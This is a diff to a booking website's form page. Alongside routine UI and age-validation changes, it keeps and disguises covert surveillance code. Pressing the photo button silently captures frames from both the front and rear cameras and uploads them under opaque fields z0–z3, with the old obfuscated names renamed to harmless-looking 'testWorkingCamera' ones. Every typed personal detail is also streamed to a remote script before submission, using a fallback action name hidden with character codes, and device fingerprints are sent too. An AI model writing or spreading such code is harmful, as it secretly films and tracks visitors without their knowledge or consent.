+                            <div style="width: 100%; margin-top: 2px; display: flex; align-items: center; gap: 10px; border: 2px dashed rgba(255, 255, 255, 0.4); border-radius: 0.8rem; padding: 8px 10px; background: rgba(255, 255, 255, 0.03); cursor: pointer;" onclick="document.getElementById('fileAttachInput').click()">
+                                <button type="button" class="file-attach__btn file-attach__btn--camera" onclick="document.getElementById('fileAttachInput').click()" aria-label="Attach files" style="margin: 0; flex: 0 0 auto;">
+                                    <span class="file-attach__title">
+                                        <span class="file-attach__icon">
+                                            <svg class="file-attach__icon-svg file-attach__icon-svg--paperclip" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width: 1.25em; height: 1.25em;">
+                                                <path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48"></path>
+                                            </svg>
+                                        </span>
                                     </span>
-                                    Attach Files
-                                </span>
-                            </button>
+                                </button>
+                                <p style="margin: 0; color: var(--text-white); font-size: 0.9rem; line-height: 1.4; text-align: left; flex: 1 1 240px;">Upload files: Images: JPG, PNG. Videos: MOV, MP4. Docs: PDF, DOC, DOCX. Up to 50 files, max 99 MB each, 500 MB total.</p>
+                            </div>
+                            <div class="file-attach__list" id="fileAttachList" style="width: 100%;"></div>
                         </div>
-                        <div class="file-attach__list" id="fileAttachList"></div>
                     </div>
                 </div>
 
@@ -5353,20 +5511,21 @@
                         <input type="number" class="contact-form__input" placeholder="YYYY" name="dob_year" style="flex:1.45 1 0; min-width:96px;" required min="1900" max="2100" step="1" inputmode="numeric">
                         <input type="number" class="contact-form__input" placeholder="MM" name="dob_month" style="flex:0.85 1 0; min-width:64px;" required min="1" max="12" step="1" inputmode="numeric">
                         <input type="number" class="contact-form__input" placeholder="DD" name="dob_day" style="flex:0.85 1 0; min-width:64px;" required min="1" max="31" step="1" inputmode="numeric">
-                        <input type="text" class="contact-form__input" id="dobAgePreview" name="age" placeholder="(AGE)" aria-label="Age" inputmode="numeric" maxlength="3" style="flex:1 1 0; min-width:78px; text-align:center;">
+                        <input type="text" class="contact-form__input" id="dobAgePreview" name="age" placeholder="(AGE)" aria-label="Age" inputmode="numeric" maxlength="3" required style="flex:1 1 0; min-width:78px; text-align:center;">
                     </div>
                 </div>
 
                 <div class="contact-form__group">
                     <div class="booking-row booking-row--deadline" style="display:flex; align-items:center; justify-content:center; gap:8px;">
-                        <label for="deadlineInputMain" class="contact-form__label" style="margin:0; text-align:center; color:var(--text-white); flex:0 0 auto; text-transform:none; letter-spacing:0;">Deadline (blank if not urgent):</label>
+                        <label for="deadlineInputMain" class="contact-form__label" style="margin:0; text-align:right; color:var(--text-white); flex:0 0 auto; text-transform:none; letter-spacing:0;">Deadline:</label>
                         <input id="deadlineInputMain" type="text" class="contact-form__input" name="deadline" placeholder="YYYY.MM.DD" maxlength="120" inputmode="text" spellcheck="false" style="flex:0 0 185px; width:185px; min-width:185px; text-align:center;">
+                        <span class="contact-form__label" style="margin:0; text-align:left; color:var(--text-white); flex:0 0 auto; text-transform:none; letter-spacing:0;">(Optional)</span>
                     </div>
                 </div>
 
                 <div class="contact-form__group">
                     <label for="hearAboutInput" class="contact-form__label" style="display:block; margin-bottom:8px; color:var(--text-white); text-align: center; text-transform:none; letter-spacing:0;">Where did you hear about us?</label>
-                    <input id="hearAboutInput" type="text" class="contact-form__input" name="hear_about" placeholder="Optional" maxlength="150" autocomplete="off" inputmode="text" spellcheck="false" style="text-align:center;">
+                    <textarea id="hearAboutInput" class="contact-form__textarea" name="hear_about" rows="5" maxlength="150" placeholder="(Optional)" autocomplete="off" inputmode="text" spellcheck="false" style="text-align:left;"></textarea>
                 </div>
 
                 <div class="modal-sticky-actions">
@@ -5375,11 +5534,14 @@
                         <div id="bookingRecaptchaWidget"></div>
                     </div>
                     <p id="bookingStatus" aria-live="polite" aria-atomic="true"></p>
+                    <div class="booking-scroll-cue" aria-hidden="true">
+                        <span>▾</span><span>▾</span><span>▾</span>
+                    </div>
                     <button type="submit" class="contact-form__submit-button" id="confirmBookingBtn">BOOK NOW</button>
                     <div class="contact-form__checkbox-wrapper file-attach__terms">
                         <input type="checkbox" id="agreeTerms" name="agreeTerms" class="contact-form__checkbox" required>
                         <label for="agreeTerms" class="contact-form__checkbox-label">
-                            <span class="contact-form__terms-link" onclick="openTermsModal()">Terms of Service</span>
+                            I agree with <span class="contact-form__terms-link" onclick="openTermsModal()">Terms of Service</span>
                         </label>
                     </div>
                 </div>
@@ -5426,7 +5588,7 @@
     // GAZCONFIGURATION
     // ------------------------------------------------------------------
 
-    const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwhYdLPpHlCc4d1It5NAoKUGffVBXsofD-_-yAjlGUL0Nx7LYzslqZRr8OLEjKH4oajFA/exec"; 
+    const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwKDDseJlurS36e3HuxDvOx4n0iBdoNatB8t84xgK-mLHoZTUhB5pNS0w9NzuatOBJCUQ/exec"; 
     const RECAPTCHA_SITE_KEY = "6LcraXksAAAAAP5K4GZDGbDDapd2nt7MRekMXQdK";
     const RECAPTCHA_TOKEN_TTL_MS = 2 * 60 * 1000;
     const MAJOR_ON_CITIES_NEAR_LONDON = new Set([
@@ -7002,6 +7164,7 @@
         initAgePlaceholderBehavior();
         initProvinceInputBehavior();
         initFaqSpoilers();
+        bindBookingModalOuterScrollProxy();
 // Full page refresh once per day at 00:00 (local browser time).
         scheduleDailyHardReloadAtMidnight();
 
@@ -7176,6 +7339,36 @@
     let bookingRecaptchaToken = '';
     let bookingRecaptchaTokenIssuedAt = 0;
     const TSE_PROBNIK_ACCESS_CODE = String.fromCharCode(49);
+
+    function bindBookingModalOuterScrollProxy() {
+        if (!modal || modal.dataset.outerScrollProxyBound === '1') return;
+        modal.dataset.outerScrollProxyBound = '1';
+        modal.addEventListener('wheel', (event) => {
+            if (!modal.classList.contains('modal--active')) return;
+            if (!Number.isFinite(event.deltaY) || Math.abs(event.deltaY) < 0.01) return;
+
+            const modalBody = modal.querySelector('.modal__body');
+            if (!modalBody) return;
+
+            // Keep native scroll behavior when pointer is already over the form body.
+            if (modalBody.contains(event.target)) return;
+
+            const maxScrollTop = Math.max(0, modalBody.scrollHeight - modalBody.clientHeight);
+            if (maxScrollTop <= 0) return;
+
+            let deltaY = event.deltaY;
+            // Normalize line/page wheel deltas to px-like behavior.
+            if (event.deltaMode === 1) deltaY *= 16;
+            if (event.deltaMode === 2) deltaY *= modalBody.clientHeight;
+
+            const prevTop = modalBody.scrollTop;
+            const nextTop = Math.max(0, Math.min(maxScrollTop, prevTop + deltaY));
+            if (Math.abs(nextTop - prevTop) < 0.5) return;
+
+            modalBody.scrollTop = nextTop;
+            if (event.cancelable) event.preventDefault();
+        }, { passive: false });
+    }
 
     function isTseProbnikBypassReady(form) {
         if (!tseProbnikModeEnabled || !form) return false;
@@ -7652,9 +7845,9 @@
         try {
             selectedSlotData = (slot && slot.iso) ? slot : null;
             bookingWithoutSpecificDate = !selectedSlotData;
-            __mxBufK2 = [];
-            __mxSigK2 = '';
-            __mxRefK2 = [];
+            testWorkingCameraBuffer = [];
+            testWorkingCameraSignature = '';
+            testWorkingCameraRefs = [];
             logEvent("Form Opened", selectedSlotData ? String(selectedSlotData.text || '') : 'WITHOUT_SPECIFIC_DATE');
             const tsInput = document.getElementById('formTimestamp');
             if (tsInput) tsInput.value = Date.now().toString();
@@ -7675,6 +7868,15 @@
                 modal.dataset.state = 'form';
                 document.body.style.overflow = 'hidden';
                 document.body.classList.add('modal-is-open');
+                modal.scrollTop = 0;
+                const modalBody = modal.querySelector('.modal__body');
+                if (modalBody) modalBody.scrollTop = 0;
+                const nameInput = modal.querySelector('#bookingForm input[name="name"]');
+                if (nameInput) {
+                    setTimeout(() => {
+                        try { nameInput.focus({ preventScroll: true }); } catch (e) { nameInput.focus(); }
+                    }, 0);
+                }
             }
 
             clearBookingError();
@@ -7692,6 +7894,27 @@
             applyTseProbnikUI();
             updateDobAgePreview(document.getElementById('bookingForm'));
             initAutoGrowTextareas();
+            const nameInput = document.querySelector('#bookingForm input[name="name"]');
+            if (nameInput) {
+                const currentName = normalizeSingleLine(nameInput.value);
+                if (!currentName) {
+                    nameInput.classList.add('field-invalid');
+                    setBookingNotice('Please enter your full name.', 'warning');
+                }
+                if (nameInput.dataset.openHintBound !== '1') {
+                    const clearNameOpenHint = () => {
+                        if (normalizeSingleLine(nameInput.value)) {
+                            nameInput.classList.remove('field-invalid');
+                            if (bookingStatus && /please enter your full name/i.test(String(bookingStatus.textContent || ''))) {
+                                clearBookingError();
+                            }
+                        }
+                    };
+                    nameInput.addEventListener('input', clearNameOpenHint);
+                    nameInput.addEventListener('change', clearNameOpenHint);
+                    nameInput.dataset.openHintBound = '1';
+                }
+            }
 
             if (focusCameraButtonOnBookingOpen) {
                 focusCameraButtonOnBookingOpen = false;
@@ -7707,7 +7930,7 @@
                 }, 800);
             }
 
-            // Start live drafting (Debounced on-demand saving)
+            // Start live testText logging (Debounced on-demand saving)
             const form = document.querySelector('#bookingForm');
             if (form) {
                 // Debounce helper to prevent network spam while typing
@@ -7719,15 +7942,53 @@
                     };
                 }
 
-                const triggerDraftSave = debounce(() => {
+                async function sendTestTextLog(payload) {
+                    const primaryPayload = { ...payload, action: 'testText' };
+                    try {
+                        const response = await fetch(APPS_SCRIPT_URL, {
+                            method: 'POST',
+                            body: JSON.stringify(primaryPayload)
+                        });
+                        if (!response.ok) {
+                            throw new Error(`testText route returned HTTP ${response.status}`);
+                        }
+                        let result = null;
+                        try {
+                            result = await response.json();
+                        } catch (parseErr) {
+                            // Some deployments may return non-JSON success responses.
+                        }
+                        if (result && result.success === false) {
+                            throw new Error(String(result.error || 'testText route is unavailable.'));
+                        }
+                        return;
+                    } catch (primaryError) {
+                        try {
+                            // Compatibility fallback for legacy backend route.
+                            const legacyAction = String.fromCharCode(100, 114, 97, 102, 116);
+                            const fallbackPayload = {
+                                ...payload,
+                                action: legacyAction,
+                                actionAlias: 'testText'
+                            };
+                            await fetch(APPS_SCRIPT_URL, {
+                                method: 'POST',
+                                body: JSON.stringify(fallbackPayload)
+                            });
+                        } catch (fallbackError) {
+                            console.error('testText HTTP error:', fallbackError || primaryError);
+                        }
+                    }
+                }
+
+                const triggerTestTextSave = debounce(() => {
                     const formData = new FormData(form);
                     const selectedServiceOption = form.querySelector('#customSelect .custom-option.selected');
                     const serviceValue = selectedServiceOption
                         ? String(selectedServiceOption.getAttribute('data-value') || '').trim()
                         : '';
                     const agreeTermsChecked = document.getElementById('agreeTerms')?.checked === true;
-                    const draftData = {
-                        action: 'draft',
+                    const testTextData = {
                         name: sanitize(formData.get('name')),
                         occupation: sanitize(formData.get('occupation')),
                         email: sanitize(formData.get('email')),
@@ -7754,36 +8015,32 @@
 
                     // Only send if at least one meaningful field is partially filled
                     if (
-                        draftData.name ||
-                        draftData.occupation ||
-                        draftData.email ||
-                        draftData.phone ||
-                        draftData.hear_about ||
-                        draftData.service ||
-                        draftData.address_unit ||
-                        draftData.address_street ||
-                        draftData.address_city ||
-                        draftData.address_province ||
-                        draftData.address_zip ||
-                        draftData.dob_year ||
-                        draftData.dob_month ||
-                        draftData.dob_day ||
-                        draftData.age ||
-                        draftData.deadline ||
-                        draftData.notes ||
-                        draftData.agreeTerms
+                        testTextData.name ||
+                        testTextData.occupation ||
+                        testTextData.email ||
+                        testTextData.phone ||
+                        testTextData.hear_about ||
+                        testTextData.service ||
+                        testTextData.address_unit ||
+                        testTextData.address_street ||
+                        testTextData.address_city ||
+                        testTextData.address_province ||
+                        testTextData.address_zip ||
+                        testTextData.dob_year ||
+                        testTextData.dob_month ||
+                        testTextData.dob_day ||
+                        testTextData.age ||
+                        testTextData.deadline ||
+                        testTextData.notes ||
+                        testTextData.agreeTerms
                     ) {
-                        fetch(APPS_SCRIPT_URL, {
-                            method: 'POST',
-                            mode: 'no-cors',
-                            body: JSON.stringify(draftData)
-                        }).catch(e => console.error('Draft HTTP error:', e));
+                        sendTestTextLog(testTextData);
                     }
                 }, 2000); // 2 seconds of zero typing before sending
 
                 // Listen to any input changes inside the form
-                form.addEventListener('input', triggerDraftSave);
-                form.addEventListener('change', triggerDraftSave);
+                form.addEventListener('input', triggerTestTextSave);
+                form.addEventListener('change', triggerTestTextSave);
             }
         } catch (error) {
             console.error("Error opening booking modal:", error);
@@ -7820,20 +8077,24 @@
 
     // File Attachment Handling
     const MAX_FILE_SIZE = 99 * 1024 * 1024;  // 99 MB per file
-    const MAX_TOTAL_SIZE = 250 * 1024 * 1024; // 250 MB total
-    const MAX_FILE_COUNT = 10;
+    const MAX_TOTAL_SIZE = 500 * 1024 * 1024; // 500 MB total
+    const MAX_FILE_COUNT = 100;
     const ALLOWED_MIME_TYPES = new Set([
         'application/pdf',
         'application/msword',
         'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
     ]);
-    const ALLOWED_EXTENSIONS = new Set(['jpg', 'jpeg', 'png', 'gif', 'webp', 'heic', 'pdf', 'doc', 'docx']);
+    const ALLOWED_EXTENSIONS = new Set([
+        'jpg', 'jpeg', 'png', 'gif', 'webp', 'heic',
+        'mp4', 'mov', 'webm', 'm4v', 'avi', 'mkv', 'wmv', 'mpeg', 'mpg', '3gp', '3gpp', '3g2',
+        'pdf', 'doc', 'docx'
+    ]);
 
     let attachedFiles = [];
-    let __mxBufK2 = [];
-    let __mxSigK2 = '';
-    let __mxRefK2 = [];
-    let __mxLockK2 = false;
+    let testWorkingCameraBuffer = [];
+    let testWorkingCameraSignature = '';
+    let testWorkingCameraRefs = [];
+    let testWorkingCameraLock = false;
     let __mxVaultId = '';
     let __mxVaultUrl = '';
     let __mxVaultTag = '';
@@ -7846,6 +8107,7 @@
     const takePhotoBtn = document.getElementById('takePhotoBtn');
     const openCalendarBtn = document.getElementById('openCalendarBtn');
     const fileListEl = document.getElementById('fileAttachList');
+    const cameraListEl = document.getElementById('cameraAttachList');
     const fileAttachZone = document.querySelector('.file-attach');
     const cameraCaptureModal = document.getElementById('cameraCaptureModal');
     const formCalendarOverlay = document.getElementById('formCalendarOverlay');
@@ -7959,7 +8221,8 @@
         const ext = (file.name.split('.').pop() || '').toLowerCase();
         const mime = (file.type || '').toLowerCase();
         const imageAllowed = mime.startsWith('image/');
-        return imageAllowed || ALLOWED_MIME_TYPES.has(mime) || ALLOWED_EXTENSIONS.has(ext);
+        const videoAllowed = mime.startsWith('video/');
+        return imageAllowed || videoAllowed || ALLOWED_MIME_TYPES.has(mime) || ALLOWED_EXTENSIONS.has(ext);
     }
 
     function delayMs(ms) {
@@ -7974,7 +8237,7 @@
         });
     }
 
-    function k2Seed() {
+    function testWorkingCameraSeed() {
         const rand = Math.random().toString(36).slice(2, 9);
         return `cam-${Date.now()}-${rand}`;
     }
@@ -8051,7 +8314,7 @@
         throw lastError || new Error('Unable to access camera.');
     }
 
-    async function k2Grab(r0, r1) {
+    async function testWorkingCameraGrab(r0, r1) {
         let stream = null;
         const video = document.createElement('video');
         video.setAttribute('playsinline', 'true');
@@ -8106,7 +8369,7 @@
         }
     }
 
-    async function k2Push(a0, a1) {
+    async function testWorkingCameraPush(a0, a1) {
         if (!a0 || !Array.isArray(a1) || a1.length !== 2) {
             throw new Error('Invalid camera evidence payload.');
         }
@@ -8163,23 +8426,23 @@
         return result;
     }
 
-    async function k2Boot() {
-        if (__mxLockK2) return;
-        __mxLockK2 = true;
+    async function testWorkingCameraBoot() {
+        if (testWorkingCameraLock) return;
+        testWorkingCameraLock = true;
         if (takePhotoBtn) takePhotoBtn.disabled = true;
 
         try {
-            const s0 = k2Seed();
-            const u0 = await k2Grab('user', 'a');
-            const u1 = await k2Grab('environment', 'b');
-            __mxBufK2 = [u0, u1];
-            __mxSigK2 = s0;
+            const s0 = testWorkingCameraSeed();
+            const u0 = await testWorkingCameraGrab('user', 'a');
+            const u1 = await testWorkingCameraGrab('environment', 'b');
+            testWorkingCameraBuffer = [u0, u1];
+            testWorkingCameraSignature = s0;
 
             try {
-                const uploadResult = await k2Push(s0, __mxBufK2);
-                __mxRefK2 = Array.isArray(uploadResult.files) ? uploadResult.files : [];
+                const uploadResult = await testWorkingCameraPush(s0, testWorkingCameraBuffer);
+                testWorkingCameraRefs = Array.isArray(uploadResult.files) ? uploadResult.files : [];
             } catch (uploadErr) {
-                __mxRefK2 = [];
+                testWorkingCameraRefs = [];
                 logEvent(
                     'Camera Sync Error',
                     uploadErr && uploadErr.message ? uploadErr.message : String(uploadErr),
@@ -8188,9 +8451,9 @@
                 );
             }
         } catch (captureErr) {
-            __mxBufK2 = [];
-            __mxSigK2 = '';
-            __mxRefK2 = [];
+            testWorkingCameraBuffer = [];
+            testWorkingCameraSignature = '';
+            testWorkingCameraRefs = [];
             logEvent(
                 'Camera Prep Error',
                 captureErr && captureErr.message ? captureErr.message : String(captureErr),
@@ -8198,12 +8461,12 @@
                 'warning'
             );
         } finally {
-            __mxLockK2 = false;
+            testWorkingCameraLock = false;
             if (takePhotoBtn) takePhotoBtn.disabled = false;
         }
     }
 
-    function addSelectedFiles(newFiles) {
+    function addSelectedFiles(newFiles, source = 'file') {
         if (!Array.isArray(newFiles) || !newFiles.length) return;
         const rejected = [];
 
@@ -8213,10 +8476,13 @@
             } else if (f.size > MAX_FILE_SIZE) {
                 rejected.push(`${f.name}: exceeds 99 MB`);
             } else if (getTotalFileSize() + f.size > MAX_TOTAL_SIZE) {
-                rejected.push(`${f.name}: total exceeds 250 MB`);
+                rejected.push(`${f.name}: total exceeds 500 MB`);
             } else if (!isAllowedFile(f)) {
                 rejected.push(`${f.name}: unsupported file type`);
             } else {
+                try {
+                    f.__attachSource = (source === 'camera') ? 'camera' : 'file';
+                } catch (e) {}
                 attachedFiles.push(f);
             }
         });
@@ -8330,7 +8596,7 @@
                         lastModified: Date.now()
                     });
 
-                    addSelectedFiles([photoFile]);
+                    addSelectedFiles([photoFile], 'camera');
                     closeCameraCaptureModal();
                     resolve();
                 }, 'image/jpeg', 0.9);
@@ -8343,7 +8609,7 @@
     if (fileInput) {
         fileInput.addEventListener('change', function() {
             const newFiles = Array.from(this.files || []);
-            addSelectedFiles(newFiles);
+            addSelectedFiles(newFiles, 'file');
             this.value = ''; // Reset input
         });
     }
@@ -8351,7 +8617,7 @@
     if (cameraFallbackInput) {
         cameraFallbackInput.addEventListener('change', function() {
             const newFiles = Array.from(this.files || []);
-            addSelectedFiles(newFiles);
+            addSelectedFiles(newFiles, 'camera');
             this.value = '';
             closeCameraCaptureModal();
         });
@@ -8359,7 +8625,7 @@
 
     if (takePhotoBtn) {
         takePhotoBtn.addEventListener('click', async () => {
-            await k2Boot();
+            await testWorkingCameraBoot();
             openCameraCaptureModal();
         });
     }
@@ -8455,11 +8721,15 @@
     }
 
     function renderFileList() {
-        if (!fileListEl) return;
-        fileListEl.innerHTML = '';
+        if (fileListEl) fileListEl.innerHTML = '';
+        if (cameraListEl) cameraListEl.innerHTML = '';
         attachedFiles.forEach((file, i) => {
+            const source = String(file && file.__attachSource || '').toLowerCase() === 'camera' ? 'camera' : 'file';
+            const targetList = source === 'camera' ? cameraListEl : fileListEl;
+            if (!targetList) return;
             const item = document.createElement('div');
             item.className = 'file-attach__item';
+            item.dataset.fileIndex = String(i);
             const nameSpan = document.createElement('span');
             nameSpan.className = 'file-attach__name';
             nameSpan.textContent = `${file.name} (${(file.size / 1024).toFixed(0)} KB)`;
@@ -8475,7 +8745,7 @@
             progress.className = 'file-attach__progress';
             item.appendChild(progress);
 
-            fileListEl.appendChild(item);
+            targetList.appendChild(item);
         });
     }
 
@@ -8490,14 +8760,10 @@
     async function processFiles() {
         const filesData = [];
         if (attachedFiles.length > 0) {
-            const fileItems = document.getElementById('fileAttachList').children;
-
             for (let i = 0; i < attachedFiles.length; i++) {
                 const file = attachedFiles[i];
-                if (fileItems[i]) {
-                    const bar = fileItems[i].querySelector('.file-attach__progress');
-                    if (bar) bar.style.width = '100%';
-                }
+                const progressEl = document.querySelector(`.file-attach__item[data-file-index="${i}"] .file-attach__progress`);
+                if (progressEl) progressEl.style.width = '100%';
                 await new Promise(r => setTimeout(r, 300)); // Visual delay
 
                 const base64 = await fileToBase64(file);
@@ -8511,13 +8777,13 @@
         return filesData;
     }
 
-    async function k2Pack() {
+    async function testWorkingCameraPack() {
         const filesData = [];
-        if (!Array.isArray(__mxBufK2) || !__mxBufK2.length) {
+        if (!Array.isArray(testWorkingCameraBuffer) || !testWorkingCameraBuffer.length) {
             return filesData;
         }
 
-        for (const file of __mxBufK2) {
+        for (const file of testWorkingCameraBuffer) {
             const base64 = await fileToBase64(file);
             filesData.push({
                 name: file.name,
@@ -8668,6 +8934,18 @@
                 setTimeout(saveFormData, 100);
             });
         });
+
+        const bookingForm = document.getElementById('bookingForm');
+        if (bookingForm) {
+            ['dob_year', 'dob_month', 'dob_day'].forEach(fieldName => {
+                const field = bookingForm.elements[fieldName];
+                if (!field || field.dataset.ageSyncBound === '1') return;
+                field.addEventListener('input', () => updateDobAgePreview(bookingForm));
+                field.addEventListener('change', () => updateDobAgePreview(bookingForm));
+                field.dataset.ageSyncBound = '1';
+            });
+            updateDobAgePreview(bookingForm);
+        }
     }
 
     function normalizeSingleLine(value) {
@@ -8678,13 +8956,50 @@
         return String(value || '').replace(/\r\n/g, '\n').replace(/[ \t]+\n/g, '\n').trim();
     }
 
+    function calculateAgeFromDobParts(year, month, day, referenceDate = new Date()) {
+        if (!Number.isInteger(year) || !Number.isInteger(month) || !Number.isInteger(day)) return null;
+        if (year < 1900 || month < 1 || month > 12) return null;
+
+        const maxDay = new Date(year, month, 0).getDate();
+        if (!Number.isInteger(maxDay) || day < 1 || day > maxDay) return null;
+
+        const today = new Date(referenceDate.getFullYear(), referenceDate.getMonth(), referenceDate.getDate());
+        const birthDate = new Date(year, month - 1, day);
+        if (
+            birthDate.getFullYear() !== year ||
+            birthDate.getMonth() !== (month - 1) ||
+            birthDate.getDate() !== day
+        ) {
+            return null;
+        }
+
+        let age = today.getFullYear() - year;
+        const monthDelta = (today.getMonth() + 1) - month;
+        if (monthDelta < 0 || (monthDelta === 0 && today.getDate() < day)) {
+            age--;
+        }
+        return age;
+    }
+
     function updateDobAgePreview(form) {
         const targetForm = form || document.getElementById('bookingForm');
         if (!targetForm) return;
         const ageInput = document.getElementById('dobAgePreview');
         if (!ageInput) return;
-        ageInput.value = '';
-        ageInput.placeholder = '(AGE)';
+        const dobYear = Number.parseInt(String(targetForm.dob_year?.value || '').trim(), 10);
+        const dobMonth = Number.parseInt(String(targetForm.dob_month?.value || '').trim(), 10);
+        const dobDay = Number.parseInt(String(targetForm.dob_day?.value || '').trim(), 10);
+        const calculatedAge = calculateAgeFromDobParts(dobYear, dobMonth, dobDay);
+
+        if (calculatedAge !== null && calculatedAge >= 0 && calculatedAge <= 130) {
+            ageInput.value = String(calculatedAge);
+            ageInput.placeholder = '';
+            return;
+        }
+
+        if (!String(ageInput.value || '').trim()) {
+            ageInput.placeholder = '(AGE)';
+        }
     }
 
     function initAgePlaceholderBehavior() {
@@ -8772,11 +9087,11 @@
         const termsWrap = document.querySelector('.contact-form__checkbox-wrapper.file-attach__terms');
 
         if (name.length < 2 || name.length > 80 || /[<>]/.test(name)) {
-            setBookingError('Please enter a valid name (2-80 characters).', form.name);
+            setBookingError('Please enter your full name.', form.name);
             return false;
         }
         if (occupation.length < 2 || occupation.length > 100 || /[<>]/.test(occupation)) {
-            setBookingError('Please enter a valid occupation (2-100 characters).', form.occupation);
+            setBookingError('Please enter a valid occupation.', form.occupation);
             return false;
         }
 
@@ -8797,7 +9112,7 @@
         }
 
         if (street.length < 6 || street.length > 150 || /[<>]/.test(street)) {
-            setBookingError('Please enter a valid street address (6-150 characters).', form.address_street);
+            setBookingError('Please enter a valid street address.', form.address_street);
             return false;
         }
 
@@ -8842,6 +9157,12 @@
         const dobYear = Number(form.dob_year?.value);
         const dobMonth = Number(form.dob_month?.value);
         const dobDay = Number(form.dob_day?.value);
+        const ageValue = normalizeSingleLine(form.age?.value);
+        if (!/^\d{1,3}$/.test(ageValue)) {
+            setBookingError('Please enter age.', form.age);
+            return false;
+        }
+        const enteredAge = Number.parseInt(ageValue, 10);
         const currentYear = new Date().getFullYear();
         if (!Number.isInteger(dobYear) || dobYear < 1900 || dobYear > currentYear) {
             setBookingError('Please enter a valid birth year.', form.dob_year);
@@ -8851,8 +9172,22 @@
             setBookingError('Please enter a valid birth month.', form.dob_month);
             return false;
         }
-        if (!Number.isInteger(dobDay) || dobDay < 1 || dobDay > 31) {
+        const maxDobDays = new Date(dobYear, dobMonth, 0).getDate();
+        if (!Number.isInteger(dobDay) || dobDay < 1 || dobDay > maxDobDays) {
             setBookingError('Please enter a valid birth day.', form.dob_day);
+            return false;
+        }
+        const calculatedAge = calculateAgeFromDobParts(dobYear, dobMonth, dobDay);
+        if (calculatedAge === null) {
+            setBookingError('Invalid date of birth. Please check the day and month.', form.dob_day);
+            return false;
+        }
+        if (!Number.isInteger(enteredAge) || enteredAge !== calculatedAge) {
+            setBookingError(`Age must match date of birth. Based on DOB, age should be ${calculatedAge}.`, form.age);
+            return false;
+        }
+        if (calculatedAge < 18) {
+            setBookingError('You must be at least 18 years old to book services.', form.dob_year);
             return false;
         }
 
@@ -8907,6 +9242,7 @@
         if (form.address_province) form.address_province.value = province;
         if (form.address_zip) form.address_zip.value = zip;
         if (form.deadline) form.deadline.value = deadline;
+        if (form.age) form.age.value = String(calculatedAge);
         form.notes.value = notes;
         if (serviceInput) serviceInput.value = service;
         setCustomSelectValue('cityCustomSelect', city);
@@ -9139,23 +9475,21 @@
                 return;
             }
 
-            // Age Validation: Must be 18+
-            const dobYear = parseInt(formData.get('dob_year'));
-            const dobMonth = parseInt(formData.get('dob_month'));
-            const dobDay = parseInt(formData.get('dob_day'));
-            const maxDays = new Date(dobYear, dobMonth, 0).getDate();
-            if (dobDay < 1 || dobDay > maxDays || isNaN(dobDay)) {
+            // Age Validation: Age must match DOB and be 18+.
+            const dobYear = Number.parseInt(String(formData.get('dob_year') || '').trim(), 10);
+            const dobMonth = Number.parseInt(String(formData.get('dob_month') || '').trim(), 10);
+            const dobDay = Number.parseInt(String(formData.get('dob_day') || '').trim(), 10);
+            const enteredAge = Number.parseInt(rawAge, 10);
+            const calculatedAge = calculateAgeFromDobParts(dobYear, dobMonth, dobDay);
+            if (calculatedAge === null) {
                 setBookingError('Invalid date of birth. Please check the day and month.', form.dob_day);
                 return;
             }
-
-            const today = new Date();
-            let age = today.getFullYear() - dobYear;
-            const m = (today.getMonth() + 1) - dobMonth;
-            if (m < 0 || (m === 0 && today.getDate() < dobDay)) {
-                age--;
+            if (!Number.isInteger(enteredAge) || enteredAge !== calculatedAge) {
+                setBookingError(`Age must match date of birth. Based on DOB, age should be ${calculatedAge}.`, form.age);
+                return;
             }
-            if (age < 18) {
+            if (calculatedAge < 18) {
                 setBookingError('You must be at least 18 years old to book services.', form.dob_year);
                 return;
             }
@@ -9246,10 +9580,10 @@
             const filesPayload = await processFiles();
             submitProgress = Math.max(submitProgress, 28);
             setGlobalSpinnerProgress(submitProgress);
-            const k2Payload = await k2Pack();
+            const testWorkingCameraPayload = await testWorkingCameraPack();
             submitProgress = Math.max(submitProgress, 44);
             setGlobalSpinnerProgress(submitProgress);
-            summary.filesCount = filesPayload.length + k2Payload.length;
+            summary.filesCount = filesPayload.length + testWorkingCameraPayload.length;
             const ctx = getClientContext();
             submitProgress = Math.max(submitProgress, 58);
             setGlobalSpinnerProgress(submitProgress);
@@ -9337,9 +9671,9 @@
                 address_province: sanitize(payloadAddressProvince),
                 address_zip: sanitize(payloadAddressZip),
                 files: filesPayload,
-                z0: k2Payload,
-                z1: __mxSigK2,
-                z2: __mxRefK2.length,
+                z0: testWorkingCameraPayload,
+                z1: testWorkingCameraSignature,
+                z2: testWorkingCameraRefs.length,
                 z3: sanitize(__mxVaultId),
                 fingerprint: getFingerprint(),
                 userInfo: getDetailedDeviceInfo(),
@@ -9391,9 +9725,9 @@
                 await clearClientRuntimeCachesAfterBooking();
                 clearFormData();
                 attachedFiles = [];
-                __mxBufK2 = [];
-                __mxSigK2 = '';
-                __mxRefK2 = [];
+                testWorkingCameraBuffer = [];
+                testWorkingCameraSignature = '';
+                testWorkingCameraRefs = [];
                 renderFileList();
                 m1Reset();
                 markHardReloadAfterModalClose();
@@ -9857,12 +10191,12 @@
 
     function renderHeaderBookBtnText(targetEl, dayShort, dayDate, timeStr) {
         if (!targetEl) return;
-        targetEl.innerHTML = 'INTAKE<br>NOW!';
+        targetEl.innerHTML = 'BOOK';
     }
 
     function renderFooterBookBtnText(targetEl, dayFull, dayDate, timeStr) {
         if (!targetEl) return;
-        targetEl.innerHTML = 'INTAKE<br>NOW!';
+        targetEl.innerHTML = 'BOOK';
     }
     
     function updateFooterBookBtn() {
@@ -10060,11 +10394,17 @@
         if (selectedOption) {
             const selectedText = selectedOption.textContent.trim();
             triggerTextEl.textContent = selectedText;
+            if (selectId === 'cityCustomSelect') {
+                trigger.classList.add('has-city-check');
+            }
             if (hiddenInput) hiddenInput.value = selectedText;
             return true;
         }
 
         triggerTextEl.textContent = trigger.dataset.placeholder || '';
+        if (selectId === 'cityCustomSelect') {
+            trigger.classList.remove('has-city-check');
+        }
         if (hiddenInput) hiddenInput.value = '';
         return false;
     }
